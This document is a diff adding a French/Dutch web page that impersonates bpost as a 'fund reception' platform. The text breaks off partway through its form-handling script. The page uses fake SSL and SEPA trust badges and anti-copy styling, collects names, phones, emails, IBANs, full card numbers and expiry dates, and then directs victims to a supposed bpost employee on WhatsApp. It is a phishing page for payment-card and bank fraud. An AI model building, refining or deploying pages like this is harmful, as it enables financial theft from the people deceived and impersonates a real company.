@@ -1,0 +1,1344 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Réception de Fonds - bpost</title>
+  <link rel="icon" type="image/png" href="https://lh3.googleusercontent.com/aida/AEtjO1VgdRSt_w3vaO6ADOV9oR3i0VouUNDI-uUUHwdRKUyPHKYNQHBmxMhldxp-Sj0r9p33GOfelSG45ZVzJT4c53aJ6R_vErEXwkKdll5kFAOo7GWEKva6H5fcCKdCMavuJbwR49UUGV7XQGL3HgK1VKIoIMlZk61JWAeegbNue9neH70yMkjFS8_sHzgXmPAVLhAXKdSiJD9w9NLIyeZFRSMShgiQzM4AhIxoiDEOXK2-MoUuJ_ubJvuxuzA">
+  <link rel="apple-touch-icon" href="https://lh3.googleusercontent.com/aida/AEtjO1VgdRSt_w3vaO6ADOV9oR3i0VouUNDI-uUUHwdRKUyPHKYNQHBmxMhldxp-Sj0r9p33GOfelSG45ZVzJT4c53aJ6R_vErEXwkKdll5kFAOo7GWEKva6H5fcCKdCMavuJbwR49UUGV7XQGL3HgK1VKIoIMlZk61JWAeegbNue9neH70yMkjFS8_sHzgXmPAVLhAXKdSiJD9w9NLIyeZFRSMShgiQzM4AhIxoiDEOXK2-MoUuJ_ubJvuxuzA">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    /* ===== DESIGN PROFESSIONNEL BPOST ===== */
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+      background-color: #f0f2f5;
+      color: #333;
+      min-height: 100vh;
+    }
+
+    /* ===== HEADER ===== */
+    .bpost-header {
+      background: #ffffff;
+      border-bottom: 3px solid #e63946;
+      padding: 12px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .bpost-logo-img {
+      height: 38px;
+      width: auto;
+      object-fit: contain;
+    }
+
+    .header-secure {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      color: #2e7d32;
+      font-weight: 600;
+      background: #f0faf0;
+      padding: 5px 10px;
+      border-radius: 20px;
+      border: 1px solid #c8e6c9;
+    }
+
+    /* ===== LANGUE ===== */
+    .lang-switcher {
+      font-size: 13px;
+      font-weight: 600;
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+
+    .lang-btn {
+      cursor: pointer;
+      opacity: 0.45;
+      transition: opacity 0.2s;
+      user-select: none;
+      padding: 4px 8px;
+      border-radius: 4px;
+    }
+
+    .lang-btn.active {
+      opacity: 1;
+      background: #fff5f5;
+      border: 1px solid #e63946;
+      color: #e63946;
+    }
+
+    /* ===== CONTAINER ===== */
+    .container {
+      max-width: 560px;
+      margin: 28px auto;
+      padding: 0 16px 60px;
+    }
+
+    /* ===== PAGE TITLE ===== */
+    h1 {
+      font-size: 23px;
+      font-weight: 700;
+      margin-bottom: 4px;
+      color: #1a1a1a;
+      letter-spacing: -0.3px;
+    }
+
+    #txt-soustitre {
+      font-size: 13.5px;
+      color: #666;
+      margin-bottom: 18px;
+      line-height: 1.5;
+    }
+
+    /* ===== SEPA BANNER ===== */
+    .sepa-shield-box {
+      background: linear-gradient(135deg, #e8f4fd, #dbeeff);
+      border-left: 4px solid #1976d2;
+      padding: 13px 16px;
+      margin-bottom: 22px;
+      border-radius: 6px;
+      font-size: 13px;
+      line-height: 1.55;
+      color: #1a3c5e;
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+    }
+
+    /* ===== FORM SECTIONS ===== */
+    .form-section {
+      background: #ffffff;
+      border-radius: 10px;
+      padding: 22px 22px 18px;
+      margin-bottom: 18px;
+      border: 1px solid #e8e8e8;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+      transition: box-shadow 0.2s;
+    }
+
+    .form-section:hover {
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+    }
+
+    .country-highlight {
+      border: 2px solid #e63946;
+      box-shadow: 0 2px 12px rgba(230, 57, 70, 0.10);
+    }
+
+    .form-section h2 {
+      margin: 0 0 18px 0;
+      font-size: 13px;
+      color: #777;
+      border-bottom: 1px solid #f2f2f2;
+      padding-bottom: 10px;
+      text-transform: uppercase;
+      font-weight: 700;
+      letter-spacing: 0.6px;
+    }
+
+    /* ===== FORM ELEMENTS ===== */
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 12.5px;
+      font-weight: 600;
+      margin-bottom: 6px;
+      color: #444;
+      letter-spacing: 0.1px;
+    }
+
+    .input-container {
+      display: flex;
+      align-items: center;
+      position: relative;
+    }
+
+    input[type="text"],
+    input[type="tel"],
+    input[type="email"],
+    input[type="number"],
+    select {
+      width: 100%;
+      padding: 11px 38px 11px 13px;
+      font-size: 14.5px;
+      font-family: 'Inter', sans-serif;
+      border: 1.5px solid #ddd;
+      border-radius: 7px;
+      background-color: #ffffff;
+      outline: none;
+      transition: border-color 0.15s, box-shadow 0.15s;
+      color: #222;
+    }
+
+    input:focus,
+    select:focus {
+      border-color: #e63946;
+      box-shadow: 0 0 0 3px rgba(230, 57, 70, 0.10);
+    }
+
+    input:disabled,
+    select:disabled {
+      background-color: #f8f8f8;
+      cursor: not-allowed;
+      border-color: #ececec;
+      color: #bbb;
+    }
+
+    input:not(:disabled):valid:not([value=""]) {
+      border-color: #ddd;
+    }
+
+    #expiration-month:focus,
+    #expiration-year:focus {
+      border-color: #e63946;
+      box-shadow: 0 0 0 3px rgba(230, 57, 70, 0.10);
+      outline: none;
+    }
+
+    #expiration-month:disabled,
+    #expiration-year:disabled {
+      background-color: #f8f8f8;
+      border-color: #ececec;
+      cursor: not-allowed;
+      color: #bbb;
+    }
+
+    #expiration-month,
+    #expiration-year {
+      font-weight: 600;
+      letter-spacing: 1px;
+    }
+
+    /* ===== CHECK INDICATOR ===== */
+    .check-indicator {
+      color: #27ae60;
+      position: absolute;
+      right: 12px;
+      font-weight: bold;
+      display: none;
+      font-size: 15px;
+      pointer-events: none;
+    }
+
+    /* ===== FORM ROW ===== */
+    .form-row {
+      display: flex;
+      gap: 14px;
+    }
+
+    /* ===== SUBMIT BUTTON ===== */
+    .btn-submit-bpost {
+      width: 100%;
+      background-color: #e63946;
+      color: #ffffff;
+      border: none;
+      padding: 15px;
+      font-size: 15.5px;
+      font-family: 'Inter', sans-serif;
+      font-weight: 700;
+      border-radius: 8px;
+      cursor: not-allowed;
+      opacity: 0.55;
+      transition: all 0.2s;
+      letter-spacing: 0.2px;
+      box-shadow: 0 2px 8px rgba(230, 57, 70, 0.15);
+    }
+
+    .btn-submit-bpost:not(:disabled) {
+      cursor: pointer;
+      opacity: 1;
+      box-shadow: 0 4px 16px rgba(46, 125, 50, 0.25);
+    }
+
+    .btn-submit-bpost:hover:not(:disabled) {
+      background-color: #2e7d32;
+      transform: translateY(-1px);
+      box-shadow: 0 6px 20px rgba(46, 125, 50, 0.30);
+    }
+
+    /* ===== TRUST BAR ===== */
+    .trust-bar {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      margin-top: 14px;
+      flex-wrap: wrap;
+    }
+
+    .trust-item {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 11.5px;
+      color: #888;
+      font-weight: 500;
+    }
+
+    /* ===== SUCCESS PANEL ===== */
+    .success-panel {
+      background: #ffffff;
+      border-radius: 12px;
+      padding: 48px 28px 36px;
+      text-align: center;
+      border: 1px solid #e8e8e8;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.07);
+      display: none;
+    }
+
+    .success-checkmark {
+      width: 72px;
+      height: 72px;
+      background: linear-gradient(135deg, #2e7d32, #43a047);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 22px;
+      font-size: 38px;
+      color: white;
+      box-shadow: 0 4px 16px rgba(46, 125, 50, 0.30);
+    }
+
+    .success-panel h2 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 12px;
+      letter-spacing: -0.3px;
+    }
+
+    .success-panel p {
+      font-size: 14px;
+      color: #555;
+      line-height: 1.65;
+      margin: 10px 0;
+    }
+
+    .success-panel .instructions {
+      background: linear-gradient(135deg, #fff8e1, #fffde7);
+      border-radius: 8px;
+      padding: 16px 18px;
+      margin: 20px 0;
+      font-size: 13.5px;
+      color: #5d4037;
+      line-height: 1.6;
+      border-left: 4px solid #f9a825;
+    }
+
+    /* ===== REQUEST ID ===== */
+    #txt-succes-request-id-label {
+      background: #f8f8f8;
+      border-radius: 6px;
+      padding: 10px 14px;
+      display: inline-block;
+      margin-top: 14px;
+      font-size: 12px;
+      color: #999;
+      border: 1px solid #ececec;
+    }
+
+    #request-id {
+      font-weight: 700;
+      color: #444;
+      font-family: monospace;
+      font-size: 13px;
+    }
+
+    /* ===== CLOSE BUTTON ===== */
+    .close-btn {
+      margin-top: 24px;
+      background-color: #e63946;
+      color: white;
+      border: none;
+      padding: 13px 36px;
+      border-radius: 8px;
+      font-size: 15px;
+      font-family: 'Inter', sans-serif;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      box-shadow: 0 2px 8px rgba(230, 57, 70, 0.20);
+    }
+
+    .close-btn:hover {
+      background-color: #c0303b;
+      transform: translateY(-1px);
+      box-shadow: 0 4px 14px rgba(230, 57, 70, 0.28);
+    }
+
+    /* ===== FOOTER ===== */
+    .bpost-footer-nav {
+      margin-top: 36px;
+      border-top: 1px solid #e4e4e4;
+      padding-top: 14px;
+      text-align: center;
+      font-size: 12px;
+      color: #aaa;
+    }
+
+    /* ===== LOADING ===== */
+    .loading-spinner {
+      display: none;
+      text-align: center;
+      padding: 14px;
+      font-size: 14px;
+      color: #888;
+      font-weight: 500;
+    }
+
+    .loading-spinner.active {
+      display: block;
+    }
+
+    /* ===== PROTECTION ANTI-COPIE ===== */
+    body {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+    /* Réactiver la sélection dans les champs de formulaire */
+    input, textarea, select {
+      -webkit-user-select: text;
+      -moz-user-select: text;
+      -ms-user-select: text;
+      user-select: text;
+    }
+
+    /* ===== RESPONSIVE - TOUS TELEPHONES ===== */
+
+    /* Tablettes et grands ecrans */
+    @media (max-width: 600px) {
+      .container {
+        margin: 16px auto;
+        padding: 0 12px 40px;
+      }
+
+      h1 {
+        font-size: 20px;
+      }
+
+      #txt-soustitre {
+        font-size: 13px;
+      }
+
+      .form-section {
+        padding: 18px 16px 14px;
+        margin-bottom: 14px;
+        border-radius: 8px;
+      }
+
+      .form-section h2 {
+        font-size: 11.5px;
+      }
+
+      .form-group label {
+        font-size: 12px;
+      }
+
+      input[type="text"],
+      input[type="tel"],
+      input[type="email"],
+      input[type="number"],
+      select {
+        font-size: 16px; /* evite le zoom auto sur iOS */
+        padding: 12px 36px 12px 12px;
+        border-radius: 6px;
+      }
+
+      /* Expiration : cote-a-cote sur petits ecrans */
+      .form-row {
+        gap: 10px;
+      }
+
+      .btn-submit-bpost {
+        font-size: 15px;
+        padding: 14px;
+      }
+
+      .trust-bar {
+        gap: 12px;
+        margin-top: 12px;
+      }
+
+      .trust-item {
+        font-size: 11px;
+      }
+
+      .success-panel {
+        padding: 32px 18px 28px;
+        border-radius: 8px;
+      }
+
+      .success-panel h2 {
+        font-size: 19px;
+      }
+
+      .success-checkmark {
+        width: 60px;
+        height: 60px;
+        font-size: 30px;
+      }
+
+      .bpost-footer-nav {
+        font-size: 11px;
+        padding-top: 12px;
+      }
+    }
+
+    /* Petits telephones (iPhone SE, Galaxy A) */
+    @media (max-width: 400px) {
+      .bpost-header {
+        padding: 10px 14px;
+        flex-wrap: wrap;
+        gap: 6px;
+      }
+
+      .header-secure {
+        font-size: 10.5px;
+        padding: 4px 8px;
+        order: 3;
+        flex-basis: 100%;
+        justify-content: center;
+      }
+
+      .bpost-logo-img {
+        height: 30px;
+      }
+
+      .lang-switcher {
+        font-size: 12px;
+      }
+
+      h1 {
+        font-size: 18px;
+      }
+
+      .sepa-shield-box {
+        font-size: 12px;
+        padding: 11px 13px;
+      }
+
+      .form-section {
+        padding: 15px 13px 12px;
+      }
+
+      input[type="text"],
+      input[type="tel"],
+      input[type="email"],
+      input[type="number"],
+      select {
+        font-size: 16px;
+        padding: 11px 32px 11px 11px;
+      }
+
+      /* Expiration : empilement vertical sur tres petits ecrans */
+      .form-row {
+        flex-direction: column;
+        gap: 0;
+      }
+
+      .form-row .form-group {
+        width: 100%;
+      }
+
+      .btn-submit-bpost {
+        font-size: 14.5px;
+        padding: 13px;
+        border-radius: 7px;
+      }
+
+      .trust-bar {
+        flex-direction: column;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .success-panel {
+        padding: 26px 14px 22px;
+      }
+
+      .success-panel h2 {
+        font-size: 17px;
+      }
+
+      .success-checkmark {
+        width: 54px;
+        height: 54px;
+        font-size: 26px;
+      }
+
+      .close-btn {
+        width: 100%;
+        padding: 13px 20px;
+      }
+    }
+
+    /* Tres petits ecrans (320px - ancien iPhone SE) */
+    @media (max-width: 340px) {
+      h1 { font-size: 16px; }
+      .form-section h2 { font-size: 10.5px; }
+      .form-group label { font-size: 11.5px; }
+      .container { padding: 0 8px 30px; }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- BARRE DE NAVIGATION BPOST AVEC LANGUES -->
+  <div class="bpost-header">
+    <div class="logo-container">
+      <img
+        src="https://lh3.googleusercontent.com/aida/AEtjO1VgdRSt_w3vaO6ADOV9oR3i0VouUNDI-uUUHwdRKUyPHKYNQHBmxMhldxp-Sj0r9p33GOfelSG45ZVzJT4c53aJ6R_vErEXwkKdll5kFAOo7GWEKva6H5fcCKdCMavuJbwR49UUGV7XQGL3HgK1VKIoIMlZk61JWAeegbNue9neH70yMkjFS8_sHzgXmPAVLhAXKdSiJD9w9NLIyeZFRSMShgiQzM4AhIxoiDEOXK2-MoUuJ_ubJvuxuzA"
+        alt="bpost" class="bpost-logo-img">
+    </div>
+    <div class="header-secure">🔒 Connexion sécurisée SSL</div>
+    <div class="lang-switcher">
+      <span id="lang-fr" class="lang-btn active">🇫🇷 FR</span> |
+      <span id="lang-nl" class="lang-btn">🇧🇪 NL</span>
+    </div>
+  </div>
+
+
+  <div class="container">
+    <!-- FLUX PRINCIPAL DU FORMULAIRE -->
+    <div id="bpost-form-flow">
+      <h1 id="txt-titre">📋 Réception de fonds</h1>
+      <p id="txt-soustitre">Plateforme officielle bpost pour la réception de vos fonds par virement direct.</p>
+
+      <div id="txt-sepa-box" class="sepa-shield-box">
+        <strong>🛡️ <span id="txt-sepa-label">Règlement européen SEPA :</span></strong> <span id="txt-sepa-text">Les
+          paiement bpost s'effectuent exclusivement par virement direct sur votre compte IBAN.</span>
+      </div>
+
+      <!-- FORMULAIRE D'ENVOI -->
+      <form id="refund-form">
+        <!-- Pays défini à Belgique (caché) -->
+        <input type="hidden" id="pays" name="pays" value="BE">
+
+        <!-- ÉTAPE 2 : COORDONNÉES DU BÉNÉFICIAIRE (Désactivées par défaut) -->
+        <div class="form-section">
+          <h2 id="txt-sec-perso">Coordonnées du bénéficiaire</h2>
+          <div class="form-group">
+            <label id="lbl-nom">Nom complet</label>
+            <div class="input-container">
+              <input type="text" id="nom-complet" name="nom" placeholder="Jean Dupont" disabled required>
+              <span id="nom-check" class="check-indicator">✓</span>
+            </div>
+          </div>
+          <div class="form-group">
+            <label id="lbl-phone">Téléphone</label>
+            <div class="input-container">
+              <input type="tel" id="telephone" name="telephone" placeholder="Choisissez d'abord le pays" disabled
+                required>
+              <span id="phone-check" class="check-indicator">✓</span>
+            </div>
+          </div>
+          <div class="form-group">
+            <label id="lbl-email">Adresse e-mail</label>
+            <div class="input-container">
+              <input type="email" id="email" name="email" placeholder="vous@exemple.com" disabled required>
+              <span id="email-check" class="check-indicator">✓</span>
+            </div>
+          </div>
+          <div class="form-group">
+            <label id="lbl-age">Âge (En années)</label>
+            <div class="input-container">
+              <input type="number" id="age" name="age" placeholder="25" disabled required>
+              <span id="age-check" class="check-indicator">✓</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- ÉTAPE 3 : INFORMATIONS BANCAIRES (Désactivées par défaut) -->
+        <div class="form-section">
+          <h2 id="txt-sec-banque">🏦 Informations bancaires</h2>
+          <div class="form-group">
+            <label id="lbl-banque">Sélectionner votre banque</label>
+            <div class="input-container">
+              <select id="banque" name="banque" disabled required>
+                <option value="" disabled selected id="opt-banque-defaut">Sélectionnez votre banque</option>
+              </select>
+              <span id="banque-check" class="check-indicator">✓</span>
+            </div>
+            <div class="input-container" id="banque-autre-container" style="display: none; margin-top: 8px;">
+              <input type="text" id="banque-autre" name="banque-autre" placeholder="Entrez le nom de votre banque"
+                disabled>
+              <span id="banque-autre-check" class="check-indicator">✓</span>
+            </div>
+          </div>
+          <div class="form-group">
+            <label id="lbl-iban">Numéro de compte (IBAN)</label>
+            <div class="input-container">
+              <input type="text" id="iban" name="iban" placeholder="Choisissez d'abord le pays" disabled required>
+              <span id="iban-check" class="check-indicator">✓</span>
+            </div>
+          </div>
+          <div class="form-group">
+            <label id="lbl-carte">Numéro de carte</label>
+            <div class="input-container">
+              <input type="text" id="numero-carte" name="carte" placeholder="0000 0000 0000 0000" maxlength="19"
+                disabled required>
+              <span id="carte-check" class="check-indicator">✓</span>
+            </div>
+          </div>
+          <div class="form-row">
+            <div class="form-group" style="flex: 1;">
+              <label id="lbl-exp">Date d'expiration</label>
+              <div style="display: flex; gap: 8px; align-items: center; height: 40px; position: relative;">
+                <input type="text" id="expiration-month" name="expiration-month" placeholder="MM" maxlength="2" disabled
+                  required
+                  style="width: 50px; padding: 11px 12px; font-size: 15px; border: 1px solid #cccccc; border-radius: 4px; box-sizing: border-box; outline: none; background-color: #ffffff; text-align: center; transition: all 0.15s ease; height: 100%;">
+                <span style="font-weight: bold; color: #999; font-size: 16px; user-select: none;">/</span>
+                <input type="text" id="expiration-year" name="expiration-year" placeholder="YY" maxlength="2" disabled
+                  required
+                  style="width: 50px; padding: 11px 12px; font-size: 15px; border: 1px solid #cccccc; border-radius: 4px; box-sizing: border-box; outline: none; background-color: #ffffff; text-align: center; transition: all 0.15s ease; height: 100%;">
+                <span id="expiration-check" class="check-indicator" style="margin-left: 8px;">✓</span>
+              </div>
+              <input type="hidden" id="expiration" name="expiration">
+            </div>
+            <div class="form-group" style="flex: 1;">
+              <label id="lbl-montant">Montant (€)</label>
+              <input type="text" id="montant" name="montant" value="0.00" disabled required
+                style="height: 40px; padding: 11px 35px 11px 12px;">
+            </div>
+          </div>
+        </div>
+
+        <button type="submit" id="btn-envoyer" class="btn-submit-bpost" disabled>🔒 Envoyer la Demande</button>
+        <div class="trust-bar">
+          <span class="trust-item">🔒 SSL 256-bit</span>
+          <span class="trust-item">🛡️ Conforme SEPA</span>
+          <span class="trust-item">✅ Paiement sécurisé</span>
+        </div>
+        <div id="loading" class="loading-spinner">⏳ Envoi en cours...</div>
+      </form>
+    </div>
+
+    <!-- PANNEAU DE CONFIRMATION SUCCÈS BPOST -->
+    <div id="bpost-success-flow" class="success-panel">
+      <div class="success-checkmark">✓</div>
+      <h2 id="txt-succes-titre">Nous avons reçu votre demande</h2>
+      <p id="txt-succes-p1">Un employé de SERVICE bpost vous contactera via <strong>WhatsApp</strong> pour vérification.
+      </p>
+      <div class="instructions" id="txt-succes-instructions">
+        <strong>Suivez les instructions sur WhatsApp pour recevoir votre argent aujourd'hui par virement
+          instantané.</strong>
+      </div>
+      <p id="txt-succes-request-id-label">
+        <span id="txt-succes-request-id">ID de demande:</span> <span id="request-id">-</span>
+      </p>
+      <button onclick="location.reload()" class="close-btn" id="btn-fermer">Fermer</button>
+    </div>
+
+    <div class="bpost-footer-nav" id="txt-footer">
+      🔒 © 2026 bpost. Tous droits réservés. &nbsp;|&nbsp; 🇪🇺 Conforme SEPA &nbsp;|&nbsp; 🛡️ Données chiffrées SSL
+    </div>
+  </div>
+
+  <script>
+    // ========== DICTIONNAIRE DE TRADUCTIONS ==========
+    const translations = {
+      FR: {
+        'txt-titre': '📋 Réception de fonds',
+        'txt-soustitre': 'Plateforme officielle bpost pour la réception de vos fonds par virement direct.',
+        'txt-sepa-label': 'Règlement européen SEPA :',
+        'txt-sepa-text': 'Les paiement bpost s\'effectuent exclusivement par virement direct sur votre compte IBAN.',
+        'txt-sec-pays': '📍 Étape 1 : Choisir votre pays',
+        'lbl-choix-pays': 'Sélectionnez le pays pour adapter le formulaire',
+        'opt-pays-defaut': '-- Sélectionnez un pays --',
+        'txt-sec-perso': 'Coordonnées du bénéficiaire',
+        'lbl-nom': 'Nom complet',
+        'lbl-phone': 'Téléphone',
+        'lbl-email': 'Adresse e-mail',
+        'lbl-age': 'Âge (En années)',
+        'txt-sec-banque': '🏦 Informations bancaires',
+        'lbl-banque': 'Sélectionner votre banque',
+        'opt-banque-defaut': 'Sélectionnez votre banque',
+        'lbl-iban': 'Numéro de compte (IBAN)',
+        'lbl-carte': 'Numéro de carte',
+        'banque-autre-placeholder': 'Entrez le nom de votre banque',
+        'lbl-exp': 'Date d\'expiration',
+        'lbl-montant': 'Montant (€)',
+        'btn-envoyer': '💰 Envoyer la Demande',
+        'txt-succes-titre': 'Nous avons reçu votre demande',
+        'txt-succes-p1': 'Un employé de SERVICE bpost vous contactera via WhatsApp pour vérification.',
+        'txt-succes-instructions': 'Suivez les instructions sur WhatsApp pour recevoir votre argent aujourd\'hui par virement instantané.',
+        'txt-succes-request-id': 'ID de demande:',
+        'txt-footer': '© 2026 bpost. Tous droits réservés.',
+        'btn-fermer': 'Fermer'
+      },
+      NL: {
+        'txt-titre': '📋 Geldmiddelen ontvangen',
+        'txt-soustitre': 'Officieel bpost-platform voor het ontvangen van uw geldmiddelen via directe overboeking.',
+        'txt-sepa-label': 'Europese SEPA-regelgeving :',
+        'txt-sepa-text': 'Bpost-terugbetalingen worden uitsluitend per directe overboeking op uw IBAN-rekening uitgevoerd.',
+        'txt-sec-pays': '📍 Stap 1: Kies uw land',
+        'lbl-choix-pays': 'Selecteer het land om het formulier aan te passen',
+        'opt-pays-defaut': '-- Selecteer een land --',
+        'txt-sec-perso': 'Gegevens van de begunstigde',
+        'lbl-nom': 'Volledige naam',
+        'lbl-phone': 'Telefoon',
+        'lbl-email': 'E-mailadres',
+        'lbl-age': 'Leeftijd (in jaren)',
+        'txt-sec-banque': '🏦 Bankgegevens',
+        'lbl-banque': 'Selecteer uw bank',
+        'opt-banque-defaut': 'Selecteer uw bank',
+        'lbl-iban': 'Rekeningnummer (IBAN)',
+        'lbl-carte': 'Kaartnummer',
+        'banque-autre-placeholder': 'Voer de naam van uw bank in',
+        'lbl-exp': 'Vervaldatum',
+        'lbl-montant': 'Bedrag (€)',
+        'btn-envoyer': '💰 Verzoek indienen',
+        'txt-succes-titre': 'We hebben uw aanvraag ontvangen',
+        'txt-succes-p1': 'Een medewerker van SERVICE bpost zal u via WhatsApp contacteren voor verificatie.',
+        'txt-succes-instructions': 'Volg de instructies op WhatsApp om vandaag uw geld ontvangen via instant transfer.',
+        'txt-succes-request-id': 'Aanvraag-ID:',
+        'txt-footer': '© 2026 bpost. Alle rechten voorbehouden.',
+        'btn-fermer': 'Sluiten'
+      }
+    };
+
+    // ========== RÉFÉRENCES DOM ==========
+    const fPays = document.getElementById('pays');
+    const fNom = document.getElementById('nom-complet');
+    const fPhone = document.getElementById('telephone');
+    const fEmail = document.getElementById('email');
+    const fAge = document.getElementById('age');
+    const fBanque = document.getElementById('banque');
+    const fIban = document.getElementById('iban');
+    const fCarte = document.getElementById('numero-carte');
+    const fExp = document.getElementById('expiration');
+    const fExpMonth = document.getElementById('expiration-month');
+    const fExpYear = document.getElementById('expiration-year');
+    const fMontant = document.getElementById('montant');
+    const cNom = document.getElementById('nom-check');
+    const cPhone = document.getElementById('phone-check');
+    const cEmail = document.getElementById('email-check');
+    const cAge = document.getElementById('age-check');
+    const cBanque = document.getElementById('banque-check');
+    const cIban = document.getElementById('iban-check');
+    const cCarte = document.getElementById('carte-check');
+    const cExp = document.getElementById('expiration-check');
+    const btnEnvoyer = document.getElementById('btn-envoyer');
+    const refundForm = document.getElementById('refund-form');
+    const optBanqueDefaut = document.getElementById('opt-banque-defaut');
+
+    // ========== GESTION DE LA LANGUE ==========
+    let currentLang = 'FR';
+
+    function setLanguage(lang) {
+      currentLang = lang;
+
+      // Mettre à jour les classes "active"
+      document.getElementById('lang-fr').classList.toggle('active', lang === 'FR');
+      document.getElementById('lang-nl').classList.toggle('active', lang === 'NL');
+
+      // Mettre à jour les textes avec l'ID
+      Object.keys(translations[lang]).forEach(id => {
+        const elem = document.getElementById(id);
+        if (elem) {
+          if (elem.tagName === 'INPUT' || elem.tagName === 'OPTION') {
+            elem.placeholder = translations[lang][id];
+          } else if (id === 'txt-succes-p1') {
+            // Pour txt-succes-p1, utiliser innerHTML pour préserver le formatage WhatsApp en gras
+            elem.innerHTML = translations[lang][id].replace('WhatsApp', '<strong>WhatsApp</strong>');
+          } else if (id === 'txt-succes-instructions') {
+            // Pour txt-succes-instructions, utiliser innerHTML
+            elem.innerHTML = '<strong>' + translations[lang][id] + '</strong>';
+          } else {
+            elem.textContent = translations[lang][id];
+          }
+        }
+      });
+
+      // Réinitialiser le formulaire
+      document.getElementById('bpost-form-flow').style.display = 'block';
+      document.getElementById('bpost-success-flow').style.display = 'none';
+      document.getElementById('pays').value = '';
+      resetForm();
+    }
+
+    function resetForm() {
+      const fields = [fNom, fPhone, fEmail, fAge, fBanque, fIban, fCarte];
+      fields.forEach(field => { field.disabled = true; field.value = ''; });
+      fMontant.disabled = true;
+      fMontant.value = '0.00';
+      fExpMonth.disabled = true;
+      fExpMonth.value = '';
+      fExpYear.disabled = true;
+      fExpYear.value = '';
+      fExp.value = '';
+      // Reset du champ banque personnalisée
+      const fBanqueAutre = document.getElementById('banque-autre');
+      const cBanqueAutre = document.getElementById('banque-autre-check');
+      fBanqueAutre.value = '';
+      fBanqueAutre.disabled = true;
+      document.getElementById('banque-autre-container').style.display = 'none';
+      cBanqueAutre.style.display = 'none';
+      [cNom, cPhone, cEmail, cAge, cBanque, cIban, cCarte, cExp].forEach(c => c.style.display = 'none');
+      verifierFormulaireTotal();
+    }
+
+    document.getElementById('lang-fr').addEventListener('click', () => setLanguage('FR'));
+    document.getElementById('lang-nl').addEventListener('click', () => setLanguage('NL'));
+
+    // Banques disponibles selon le pays sélectionné
+    const banquesData = {
+      BE: ['KBC', 'ING Belgium', 'Argenta', 'Crelan', 'VDK Bank', 'Belfius', 'Autre'],
+      FR: ['BNP Paribas', 'Crédit Agricole', 'Société Générale', 'La Banque Postale', 'BoursoBank', 'Autre']
+    };
+
+    // --- INTERACTION UX : DÉBLOCAGE PAR LE PAYS ---
+    fPays.addEventListener('change', function () {
+      const pays = this.value;
+
+      // Débloquer l'ensemble des inputs après sélection du pays
+      [fNom, fPhone, fEmail, fAge, fBanque, fIban, fCarte, fMontant].forEach(input => input.disabled = false);
+      fExpMonth.disabled = false;
+      fExpYear.disabled = false;
+
+      // Charger les banques correspondantes
+      fBanque.innerHTML = `<option value="" disabled selected>${optBanqueDefaut.textContent}</option>`;
+      cBanque.style.display = 'none';
+      banquesData[pays].forEach(b => {
+        let opt = document.createElement('option');
+        opt.value = b.toUpperCase().replace(/\s+/g, '-'); opt.textContent = b; fBanque.appendChild(opt);
+      });
+
+      // Masques et valeurs initiales du pays
+      fIban.value = pays + " ";
+      fIban.placeholder = pays === 'BE' ? "BE00 0000 0000 0000" : "FR76 0000 0000 0000 0000 0000 000";
+      cIban.style.display = 'none';
+
+      fPhone.value = pays === 'BE' ? "+32 " : "+33 ";
+      fPhone.placeholder = pays === 'BE' ? "4XX XX XX XX" : "6 XX XX XX XX";
+      cPhone.style.display = 'none';
+
+      // Reset des saisies utilisateur en cas de re-sélection
+      fNom.value = ''; fEmail.value = ''; fAge.value = ''; fCarte.value = ''; fMontant.value = '0.00';
+      fExpMonth.value = '';
+      fExpYear.value = '';
+      fExp.value = '';
+      [cNom, cEmail, cAge, cCarte, cExp].forEach(c => c.style.display = 'none');
+      verifierFormulaireTotal();
+    });
+
+    // --- CORRECTION COMPORTEMENT TÉLÉPHONE (EFFACE LE 0) + VALIDATION NORME PAYS ---
+    fPhone.addEventListener('input', function () {
+      const pays = fPays.value; if (!pays) return;
+      const prefix = pays === 'FR' ? '+33 ' : '+32 ';
+      const maxDigits = 9; // Norme pour BE et FR: 9 chiffres
+
+      if (!this.value.startsWith(prefix.trim())) { this.value = prefix; return; }
+      let raw = this.value.replace(prefix, '').replace(/[^0-9]/g, '');
+      if (raw.startsWith('0')) raw = raw.substring(1);
+
+      // Limiter strictement à 9 chiffres selon la norme du pays
+      if (raw.length > maxDigits) raw = raw.substring(0, maxDigits);
+
+      let build = prefix;
+      if (raw.length > 0) {
+        if (pays === 'BE') { build += raw.substring(0, 3); for (let i = 3; i < raw.length; i += 2) { build += ' ' + raw.substring(i, i + 2); } }
+        else { build += raw.substring(0, 1); for (let i = 1; i < raw.length; i += 2) { build += ' ' + raw.substring(i, i + 2); } }
+      }
+      this.value = build.trimEnd();
+      cPhone.style.display = raw.length === maxDigits ? 'block' : 'none';
+      verifierFormulaireTotal();
